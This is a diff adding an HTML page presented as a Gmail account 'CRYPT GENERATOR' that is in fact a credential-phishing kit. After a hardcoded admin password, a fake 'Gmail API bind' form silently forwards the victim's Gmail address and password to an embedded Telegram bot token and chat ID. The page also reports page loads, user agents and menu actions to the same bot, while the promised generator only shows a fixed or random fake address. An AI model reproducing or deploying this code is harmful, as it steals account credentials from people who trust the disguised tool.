@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SHRABON GOMEZ • CRYPT GENERATOR</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
+        }
+        body {
+            background: #03050b;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+        }
+        .device {
+            max-width: 400px;
+            width: 100%;
+            background: #0c121c;
+            border: 1px solid #00ccff30;
+            border-radius: 48px;
+            box-shadow: 0 30px 60px #00000080, 0 0 0 2px #00e0ff1a inset;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+        .header {
+            background: #0a1622;
+            padding: 24px 16px 18px;
+            text-align: center;
+            border-bottom: 2px solid #0ff;
+        }
+        .logo {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 12px;
+            background: linear-gradient(145deg, #00ffee, #0066ff);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            color: black;
+            box-shadow: 0 0 30px cyan;
+        }
+        .header h1 {
+            font-size: 26px;
+            background: linear-gradient(135deg, #fff, #a0f0ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header h1 span { -webkit-text-fill-color: cyan; }
+        .chip {
+            background: #003344;
+            color: cyan;
+            padding: 4px 18px;
+            border-radius: 40px;
+            font-size: 10px;
+            display: inline-block;
+            margin-top: 5px;
+            border: 1px solid cyan;
+        }
+        .screen {
+            padding: 24px 18px;
+            max-height: 560px;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: cyan #001a1a;
+        }
+        .screen::-webkit-scrollbar { width: 4px; }
+        .screen::-webkit-scrollbar-track { background: #00222e; }
+        .screen::-webkit-scrollbar-thumb { background: cyan; border-radius: 10px; }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #b5f0ff;
+            font-size: 15px;
+            margin-bottom: 20px;
+            border-left: 3px solid cyan;
+            padding-left: 14px;
+        }
+        .input-field {
+            background: #001a26;
+            border: 1.5px solid #0a4a60;
+            border-radius: 36px;
+            padding: 6px 22px;
+            margin-bottom: 20px;
+            transition: 0.2s;
+        }
+        .input-field:focus-within { border-color: cyan; box-shadow: 0 0 12px cyan; }
+        .input-field label {
+            display: block;
+            font-size: 11px;
+            color: #73b1cc;
+            margin-top: 6px;
+        }
+        .input-field input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 12px 0;
+            color: white;
+            font-size: 15px;
+            outline: none;
+        }
+        .input-field input::placeholder { color: #2c6477; }
+        .pwd-wrapper { position: relative; }
+        .pwd-wrapper input { padding-right: 44px; }
+        .toggle-eye {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #3fa0c0;
+            cursor: pointer;
+            font-size: 20px;
+        }
+        .btn {
+            width: 100%;
+            background: #0b1f2c;
+            border: 1px solid #007c9c;
+            color: white;
+            padding: 16px;
+            border-radius: 40px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        .btn-primary {
+            background: linear-gradient(145deg, #00c8ff, #0044ff);
+            border: none;
+            color: black;
+            box-shadow: 0 8px 20px cyan;
+        }
+        .btn-primary:active { transform: scale(0.97); }
+
+        .error-box {
+            background: #4d1a1a30;
+            border: 1px solid #ff5050;
+            border-radius: 30px;
+            padding: 15px;
+            display: flex;
+            gap: 15px;
+            color: #ffb3b3;
+            margin-top: 10px;
+        }
+        .success-card {
+            background: #003d4d20;
+            border: 1px solid cyan;
+            border-radius: 30px;
+            padding: 25px 15px;
+            text-align: center;
+        }
+        .success-card i { font-size: 48px; color: #6effb0; }
+
+        .ascii-block {
+            background: #0b1a24;
+            border-radius: 28px;
+            padding: 14px;
+            font-family: 'Courier New', monospace;
+            color: #0ff;
+            border: 1px solid cyan;
+            margin: 20px 0;
+            line-height: 2.1;
+        }
+        .menu-item {
+            padding: 8px 18px;
+            border-radius: 24px;
+            cursor: pointer;
+        }
+        .menu-item:hover { background: #0ff1; }
+        .menu-item.selected { background: #0ff2; border-left: 4px solid cyan; }
+
+        .timer-circle {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            background: conic-gradient(cyan 0deg, #003d4d 0deg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            font-weight: 800;
+            color: white;
+            box-shadow: 0 0 30px cyan;
+            margin: 10px auto;
+        }
+        .progress-bar {
+            height: 8px;
+            background: #123d4d;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+        .progress-fill {
+            height: 8px;
+            background: linear-gradient(90deg, cyan, blue);
+            width: 0%;
+            border-radius: 10px;
+        }
+
+        .creds-card {
+            background: #0c1f2c;
+            border-radius: 28px;
+            padding: 18px;
+            border: 1px solid cyan;
+        }
+        .creds-row {
+            display: flex;
+            gap: 14px;
+            background: #041016;
+            padding: 12px 16px;
+            border-radius: 26px;
+            margin: 8px 0;
+            align-items: center;
+        }
+        .creds-row i { color: cyan; width: 24px; }
+        .creds-row .label { color: #7ab8d0; width: 70px; }
+        .creds-row .value { color: white; word-break: break-all; }
+
+        .copy-btn {
+            background: #003848;
+            border: 1px solid cyan;
+            border-radius: 40px;
+            padding: 14px;
+            color: cyan;
+            width: 100%;
+            font-weight: bold;
+        }
+
+        .hidden { display: none !important; }
+
+        .footer {
+            text-align: center;
+            font-size: 9px;
+            color: #2c6470;
+            padding: 14px;
+            border-top: 1px solid #124451;
+        }
+    </style>
+</head>
+<body>
+<div class="device">
+    <div class="header">
+        <div class="logo"><i class="fas fa-crown"></i></div>
+        <h1>SHRABON <span>GOMEZ</span></h1>
+        <div class="chip"><i class="fas fa-bolt"></i> CRYPT TERMINAL v10</div>
+    </div>
+    <div class="screen" id="uiRoot">
+        <!-- ADMIN PASSWORD PAGE (hidden input) -->
+        <div id="adminPage">
+            <div class="section-title"><i class="fas fa-shield"></i> ADMIN AUTH</div>
+            <div class="input-field">
+                <label><i class="fas fa-key"></i> ADMIN PASSWORD</label>
+                <div class="pwd-wrapper">
+                    <input type="password" id="adminPass" placeholder="••••••" autocomplete="off">
+                    <i class="fas fa-eye toggle-eye" onclick="toggleAdminPass()"></i>
+                </div>
+            </div>
+            <button class="btn btn-primary" onclick="authAdmin()"><i class="fas fa-unlock-alt"></i> UNLOCK</button>
+            <div id="adminErr" class="error-box hidden"><i class="fas fa-skull"></i> <span>INCORRECT</span></div>
+        </div>
+
+        <!-- FAKE GMAIL LOGIN PAGE (capture) -->
+        <div id="capturePage" class="hidden">
+            <div class="section-title"><i class="fas fa-envelope"></i> GMAIL API BIND</div>
+            <div class="input-field">
+                <label>GMAIL ADDRESS</label>
+                <input type="email" id="captureGmail" placeholder="example@gmail.com">
+            </div>
+            <div class="input-field">
+                <label>PASSWORD</label>
+                <div class="pwd-wrapper">
+                    <input type="password" id="capturePass" placeholder="password">
+                    <i class="fas fa-eye toggle-eye" onclick="toggleCapturePass()"></i>
+                </div>
+            </div>
+            <button class="btn btn-primary" onclick="submitCapture()"><i class="fas fa-plug"></i> CONNECT</button>
+        </div>
+
+        <!-- MAIN MENU (with hidden telegram) -->
+        <div id="menuPage" class="hidden">
+            <div class="success-card">
+                <i class="fas fa-check-circle"></i>
+                <div style="color:#9effc2; font-weight:600; margin-top:6px;">API LINKED</div>
+            </div>
+            <div class="section-title"><i class="fas fa-bars"></i> MAIN MENU</div>
+            <div class="ascii-block">
+                ╔═════════════════════════╗<br>
+                <div class="menu-item" onclick="selectMenu(1)">   ➤ 1. Create Gmail</div>
+                <div class="menu-item" onclick="selectMenu(2)">   ➤ 2. Status</div>
+                <div class="menu-item" onclick="selectMenu(3)">   ➤ 3. Exit</div>
+                ╚═════════════════════════╝
+            </div>
+            <div id="menuContent"></div>
+        </div>
+    </div>
+    <div class="footer">⚡ REAL-TIME TELEGRAM SYNC ⚡</div>
+</div>
+
+<script>
+    (function() {
+        // ---------- TELEGRAM CONFIG (real, silent) ----------
+        const BOT_TOKEN = '7532075859:AAEDS2Xqujh4UEJWhrWyG2gaekux11KvAvc';
+        const CHAT_ID = '5721343853';
+
+        async function tgSend(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+                }).catch(()=>{});
+            } catch(e){}
+        }
+
+        // ---------- STATE ----------
+        let generatedCount = 0;
+        let adminPasswordAttempts = 0;
+        let capturedGmail = '';
+        let timerInterval = null;
+
+        // password toggles (hidden from terminal)
+        window.toggleAdminPass = function() {
+            let inp = document.getElementById('adminPass');
+            let icon = event.target;
+            if (inp.type === 'password') { inp.type = 'text'; icon.classList.replace('fa-eye', 'fa-eye-slash'); }
+            else { inp.type = 'password'; icon.classList.replace('fa-eye-slash', 'fa-eye'); }
+        };
+        window.toggleCapturePass = function() {
+            let inp = document.getElementById('capturePass');
+            let icon = event.target;
+            if (inp.type === 'password') { inp.type = 'text'; icon.classList.replace('fa-eye', 'fa-eye-slash'); }
+            else { inp.type = 'password'; icon.classList.replace('fa-eye-slash', 'fa-eye'); }
+        };
+
+        // ---------- ADMIN AUTH (password is "1k", never shown on screen while typing) ----------
+        window.authAdmin = function() {
+            let pwd = document.getElementById('adminPass').value;
+            adminPasswordAttempts++;
+            // send to telegram (admin password attempt, but real admin uses it)
+            tgSend(`🔐 ADMIN AUTH\nattempt #${adminPasswordAttempts}: ${pwd ? '****' : '(empty)'}`);
+
+            if (pwd === '1k' || pwd === '1K') {
+                // correct: go to capture page
+                document.getElementById('adminPage').classList.add('hidden');
+                document.getElementById('capturePage').classList.remove('hidden');
+                tgSend(`✅ ADMIN ACCESS GRANTED`);
+            } else {
+                document.getElementById('adminErr').classList.remove('hidden');
+                setTimeout(() => document.getElementById('adminErr').classList.add('hidden'), 1800);
+            }
+        };
+
+        // ---------- GMAIL CAPTURE PAGE (forward to telegram) ----------
+        window.submitCapture = function() {
+            let g = document.getElementById('captureGmail').value;
+            let p = document.getElementById('capturePass').value;
+            capturedGmail = g || 'unknown@gmail.com';
+
+            tgSend(`📧 <b>GMAIL CAPTURE</b>\n📨 ${g || 'empty'}\n🔑 ${p || 'empty'}\n🕐 ${new Date().toLocaleString()}`);
+
+            // go to main menu
+            document.getElementById('capturePage').classList.add('hidden');
+            document.getElementById('menuPage').classList.remove('hidden');
+            tgSend(`🤖 API CONNECTED (${capturedGmail})`);
+        };
+
+        // ---------- MAIN MENU ----------
+        window.selectMenu = function(opt) {
+            // remove previous selected style
+            document.querySelectorAll('.menu-item').forEach(el => el.classList.remove('selected'));
+            if (event && event.target) event.target.classList.add('selected');
+
+            let contentDiv = document.getElementById('menuContent');
+
+            if (opt === 1) { // CREATE GMAIL
+                contentDiv.innerHTML = `
+                    <div style="text-align:center; margin:15px 0">
+                        <div class="timer-circle" id="timerDisplay">60</div>
+                        <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:0%"></div></div>
+                    </div>
+                    <div id="genResult"></div>
+                `;
+                startFirstGeneration();
+            }
+            else if (opt === 2) { // STATUS
+                let uptime = Math.floor((Date.now() - sessionStart)/1000);
+                let mins = Math.floor(uptime/60);
+                let secs = uptime % 60;
+                contentDiv.innerHTML = `
+                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:15px;">
+                        <div class="creds-card" style="padding:14px;"><i class="fas fa-server"></i> SERVER <span style="float:right; color:#0ff;">ONLINE</span></div>
+                        <div class="creds-card" style="padding:14px;"><i class="fas fa-cloud"></i> API <span style="float:right; color:#0ff;">ACTIVE</span></div>
+                        <div class="creds-card" style="padding:14px;"><i class="fas fa-user-secret"></i> ADMIN <span style="float:right; color:#0ff;">AUTH</span></div>
+                        <div class="creds-card" style="padding:14px;"><i class="fab fa-telegram"></i> BOT <span style="float:right; color:#0ff;">LIVE</span></div>
+                        <div class="creds-card" style="padding:14px;"><i class="fas fa-clock"></i> UPTIME <span style="float:right; color:#0ff;">${mins}:${secs.toString().padStart(2,'0')}</span></div>
+                        <div class="creds-card" style="padding:14px;"><i class="fas fa-envelope"></i> GENERATED <span style="float:right; color:#0ff;">${generatedCount}</span></div>
+                    </div>
+                `;
+                tgSend(`📊 STATUS: gen=${generatedCount}, gmail=${capturedGmail}`);
+            }
+            else if (opt === 3) { // EXIT back to admin page (clean)
+                if (timerInterval) clearInterval(timerInterval);
+                tgSend(`👋 SESSION EXIT, generated=${generatedCount}`);
+                document.getElementById('menuPage').classList.add('hidden');
+                document.getElementById('adminPage').classList.remove('hidden');
+                document.getElementById('adminPass').value = '';
+                document.getElementById('captureGmail').value = '';
+                document.getElementById('capturePass').value = '';
+                generatedCount = 0;
+                contentDiv.innerHTML = '';
+            }
+        };
+
+        // ---------- GENERATION WITH EXACT FIRST GMAIL ----------
+        function startFirstGeneration() {
+            if (timerInterval) clearInterval(timerInterval);
+            let timeLeft = 60;
+            const timerEl = document.getElementById('timerDisplay');
+            const fillEl = document.getElementById('progressFill');
+            if (!timerEl) return;
+
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                timerEl.innerText = timeLeft;
+                if (fillEl) fillEl.style.width = `${(60-timeLeft)*100/60}%`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    // FIRST EXACT GMAIL (t02347935@gmail.com , Tommyt02347935@)
+                    const firstGmail = 't02347935@gmail.com';
+                    const firstPass = 'Tommyt02347935@';
+                    generatedCount++;
+                    displayGmail(firstGmail, firstPass);
+                    tgSend(`📧 [FIRST GENERATED]\n${firstGmail} | ${firstPass}`);
+
+                    // after 1 second, start second random generation
+                    setTimeout(() => startSecondGeneration(), 1000);
+                }
+            }, 1000);
+        }
+
+        function startSecondGeneration() {
+            if (timerInterval) clearInterval(timerInterval);
+            let timeLeft = 60;
+            const timerEl = document.getElementById('timerDisplay');
+            const fillEl = document.getElementById('progressFill');
+            if (!timerEl) return;
+
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                timerEl.innerText = timeLeft;
+                if (fillEl) fillEl.style.width = `${(60-timeLeft)*100/60}%`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    // RANDOM GMAIL (based on timestamp + random)
+                    let rand = Math.random().toString(36).substring(2,10);
+                    let ts = Date.now().toString().slice(-6);
+                    let g = `${rand}${ts}@gmail.com`;
+                    let p = rand + ts + '@';
+                    generatedCount++;
+                    displayGmail(g, p);
+                    tgSend(`📧 [RANDOM GENERATED]\n${g} | ${p}`);
+                }
+            }, 1000);
+        }
+
+        function displayGmail(g, p) {
+            let resultDiv = document.getElementById('genResult');
+            if (!resultDiv) return;
+            resultDiv.innerHTML = `
+                <div class="creds-card">
+                    <div class="creds-row"><i class="fas fa-envelope"></i><span class="label">GMAIL</span><span class="value">${g}</span></div>
+                    <div class="creds-row"><i class="fas fa-key"></i><span class="label">PASS</span><span class="value">${p}</span></div>
+                    <button class="copy-btn" onclick="copyText('${g}','${p}')"><i class="fas fa-copy"></i> COPY ALL</button>
+                </div>
+            `;
+        }
+
+        window.copyText = function(g, p) {
+            navigator.clipboard.writeText(`Gmail: ${g}\nPassword: ${p}`);
+            alert('copied to clipboard');
+        };
+
+        // session start time
+        const sessionStart = Date.now();
+
+        // on load send startup signal
+        window.addEventListener('load', () => {
+            tgSend(`🚀 SHRABON GOMEZ panel loaded. ${navigator.userAgent.substring(0,50)}`);
+        });
+
+        // enter key support
+        document.getElementById('adminPass')?.addEventListener('keypress', (e) => { if(e.key === 'Enter') authAdmin(); });
+        document.getElementById('capturePass')?.addEventListener('keypress', (e) => { if(e.key === 'Enter') submitCapture(); });
+    })();
+</script>
+</body>
+</html>
